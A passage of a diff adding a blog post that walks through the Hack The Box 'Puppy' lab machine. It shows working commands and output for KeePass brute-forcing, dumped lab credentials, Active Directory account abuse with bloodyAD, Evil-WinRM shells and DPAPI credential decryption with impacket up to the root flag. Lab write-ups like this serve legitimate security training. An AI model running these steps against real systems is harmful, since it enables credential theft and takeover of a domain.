class="line">smb: \Projects\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Sat Mar  8 16:53:36 2025</span><br><span class="line">  ..                                 DR        0  Sun Mar 23 07:07:57 2025</span><br><span class="line"></span><br><span class="line">                5080575 blocks of size 4096. 1544684 blocks available</span><br><span class="line">smb: \Projects\&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>We find a kdbx database. We cam use keepass2john+keepass4brute to get its decryption password:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/keepass4brute]</span><br><span class="line">└─$ ./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt</span><br><span class="line">keepass4brute 1.3 by r3nt0n</span><br><span class="line">https://github.com/r3nt0n/keepass4brute</span><br><span class="line"></span><br><span class="line">[+] Words tested: 36/14344392 - Attempts per minute: 69 - Estimated time remaining: 20 weeks, 4 days</span><br><span class="line">[+] Current attempt: liverpool</span><br><span class="line"></span><br><span class="line">[*] Password found: liverpool</span><br></pre></td></tr></table></figure></div>
+
+<p>We open the database and fetch these credentials:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ADAM SILVER:HJKL2025!</span><br><span class="line">ANTONY C. EDWARDS:Antman2025!</span><br><span class="line">JAMIE WILLIAMSON:JamieLove2025!</span><br><span class="line">SAMUEL BLAKE:ILY2025!</span><br><span class="line">STEVE TUCKER:Steve2025!</span><br></pre></td></tr></table></figure></div>
+<p>We can see that JAMIE, ADAM and ANT are members of the developers group AND that ANT has some interesting access:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Puppy/priv.png"
+                      alt="BloodHound"
+                ><figcaption>BloodHound</figcaption></figure></p>
+<p>Also SENIOR DEV members have GenericAll on ADAM.SILVER which can connect remotely to the system:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Puppy/priv1.png"
+                      alt="BloodHound"
+                ><figcaption>BloodHound</figcaption></figure></p>
+<p>We can also note that adam.silver account is disabled:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Puppy/adam.png"
+                      alt="BloodHound"
+                ><figcaption>BloodHound</figcaption></figure></p>
+<p>So now lets enable his account first:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/keepass4brute]</span><br><span class="line">└─$ bloodyAD --host dc.puppy.htb -d 10.10.11.70 -u ant.edwards -p <span class="string">&#x27;Antman2025!&#x27;</span> remove uac adam.silver -f ACCOUNTDISABLE</span><br><span class="line">[-] [<span class="string">&#x27;ACCOUNTDISABLE&#x27;</span>] property flags removed from adam.silver<span class="string">&#x27;s userAccountControl</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Change his password and fetch the user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/keepass4brute]</span><br><span class="line">└─$ bloodyAD --host dc.puppy.htb -d 10.10.11.70 -u ant.edwards -p <span class="string">&#x27;Antman2025!&#x27;</span> <span class="built_in">set</span> password adam.silver <span class="string">&#x27;kujenStrongPassword123!&#x27;</span></span><br><span class="line">[+] Password changed successfully!</span><br><span class="line">                                                                                                                                                                                </span><br><span class="line">┌──(kali㉿kali)-[~/keepass4brute]</span><br><span class="line">└─$ evil-winrm -i dc.puppy.htb -u adam.silver -p <span class="string">&#x27;kujenStrongPassword123!&#x27;</span>                                                        </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\Documents&gt; <span class="built_in">cd</span> ../desktop</span><br><span class="line"><span class="built_in">cat</span> user.*Evil-WinRM* PS C:\Users\adam.silver\desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">49cdbfd4295bf3d0fa438a7ed40291ca</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-DPAPI-abuse"><a href="#Privilege-Escalation-DPAPI-abuse" class="headerlink" title="Privilege Escalation - DPAPI abuse"></a>Privilege Escalation - DPAPI abuse</h2><p>During our exfiltration process, we can see a backup folder:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\backups&gt; download site-backup-2024-12-30.zip</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\backups&gt; </span><br></pre></td></tr></table></figure></div>
+<p>We can find this password inside:</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nms-auth-config.xml.bak:        <span class="tag">&lt;<span class="name">bind-password</span>&gt;</span>ChefSteph2025!<span class="tag">&lt;/<span class="name">bind-password</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>steph.cooper:ChefSteph2025!</code></p>
+<p>We will now try to read dpapi:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; download C8D69EBE9A43E9DEBF6B5FBD48B521B9</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9                   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107&gt; get-childitem -force</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407</span><br><span class="line">-a-hs-         2/23/2025   2:36 PM             24 Preferred</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107&gt; download 556a2412-1275-4ccf-b721-e6a0b4f90407</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 to 556a2412-1275-4ccf-b721-e6a0b4f90407 </span><br></pre></td></tr></table></figure></div>
+
+
+
+
+<p>And we can now attempt to decrypt it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/keepass4brute]</span><br><span class="line">└─$ impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password <span class="string">&#x27;ChefSteph2025!&#x27;</span> -sid S-1-5-21-1487982659-1829050783-2281216199-1107 </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[MASTERKEYFILE]</span><br><span class="line">Version     :        2 (2)</span><br><span class="line">Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407</span><br><span class="line">Flags       :        0 (0)</span><br><span class="line">Policy      : 4ccf1275 (1288639093)</span><br><span class="line">MasterKeyLen: 00000088 (136)</span><br><span class="line">BackupKeyLen: 00000068 (104)</span><br><span class="line">CredHistLen : 00000000 (0)</span><br><span class="line">DomainKeyLen: 00000174 (372)</span><br><span class="line"></span><br><span class="line">Decrypted key with User Key (MD4 protected)</span><br><span class="line">Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</span><br><span class="line">                                                                                                                                                                                </span><br><span class="line">┌──(kali㉿kali)-[~/keepass4brute]</span><br><span class="line">└─$ impacket-dpapi credential -f C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[CREDENTIAL]</span><br><span class="line">LastWritten : 2025-03-08 15:54:29</span><br><span class="line">Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)</span><br><span class="line">Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)</span><br><span class="line">Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)</span><br><span class="line">Target      : Domain:target=PUPPY.HTB</span><br><span class="line">Description : </span><br><span class="line">Unknown     : </span><br><span class="line">Username    : steph.cooper_adm</span><br><span class="line">Unknown     : FivethChipOnItsWay2025!</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+<p>And eventually use that password to remotely connect:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/keepass4brute]</span><br><span class="line">└─$ evil-winrm -i dc.puppy.htb -u steph.cooper_adm -p <span class="string">&#x27;FivethChipOnItsWay2025!&#x27;</span>      </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents&gt; <span class="built_in">cd</span> ../../administrator/desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\administrator\desktop&gt; <span class="built_in">cat</span> root.txt</span><br><span class="line">e75a02a424d6c3f3867a215c9fb8a4f7</span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for Puppy, hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Puppy</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-09-27 10:09:22</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-09-27 10:51:02
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/09/27/Hackthebox-Puppy/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/09/19/Hackthebox-Fluffy/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Fluffy</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Puppy</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Domain-enumeration"><span class="nav-text">Domain enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB-share-access"><span class="nav-text">SMB share access</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-DPAPI-abuse"><span class="nav-text">Privilege Escalation - DPAPI abuse</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
